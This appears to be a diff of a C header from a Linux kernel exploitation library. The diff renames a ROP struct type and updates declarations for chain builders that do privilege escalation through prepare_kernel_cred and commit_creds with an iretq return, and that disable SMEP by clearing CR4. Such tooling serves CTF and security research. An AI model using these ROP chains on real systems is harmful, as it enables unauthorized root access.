@@ -3,20 +3,18 @@
 
 #include <stdint.h>
 #include <sys/types.h>
-#include "privesc.h"
-#include "ret2user.h"
 
 /* Typedef a struct for rop chain rop[]
  *      to avoid bug when copying 0 from the chain to buffer
  *
  * ALWAYS use a struct when overflowing a buffer with ROP!
- *      We concept the stuct as 'rop', 
- *      while the raw rop chain as 'chain'
+ *      We concept the stuct as a 'buffer' for 'rop', 
+ *      while the raw rop chain as 'chain' itself
  * */
 typedef struct {
     uintptr_t *chain;
     size_t count;
-} rop_chain_t;
+} rop_buffer_t;
 
 
 /* ============= Kcreds Commit =============
@@ -25,10 +23,10 @@ typedef struct {
 
  * prepare_kernel_cred -> commit_creds -> swapgs -> iretq
  * */
-size_t chain_kcred_iretq(rop_chain_t rop,
+size_t chain_kcred_iretq(rop_buffer_t rop,
                         uintptr_t pop_rdi_ret,
                         uintptr_t prepare_kernel_cred,
-                        rop_chain_t mov_rdi_rax_chain,
+                        rop_buffer_t mov_rdi_rax_chain,
                         uintptr_t commit_creds,
                         uintptr_t swapgs_pop_rbp_ret,
                         uintptr_t iretq,
@@ -49,7 +47,7 @@ size_t chain_kcred_iretq(rop_chain_t rop,
  * */ 
 
 /* Chain up to zero out 20th bit of CR4 */
-size_t chain_cr4_smep(rop_chain_t rop, 
+size_t chain_cr4_smep(rop_buffer_t rop, 
                     uintptr_t pop_rdi_ret,
                     uintptr_t cr4_val,
                     uintptr_t mov_cr4_rdi_ret,
@@ -58,7 +56,7 @@ size_t chain_cr4_smep(rop_chain_t rop,
 
 /* ============= ROP Helpers ==============*/
 
-/* Push gadgets onto an ROP chain (rop_chain_t) */
+/* Push gadgets onto an ROP chain (rop_buffer_t) */
 #define PUSH_ROP(dst, pos, gadget) do {                    \
     if ((pos) >= (dst).count)                              \
         DIE("ROP buffer overflow at %s:%d", __FILE__, __LINE__); \
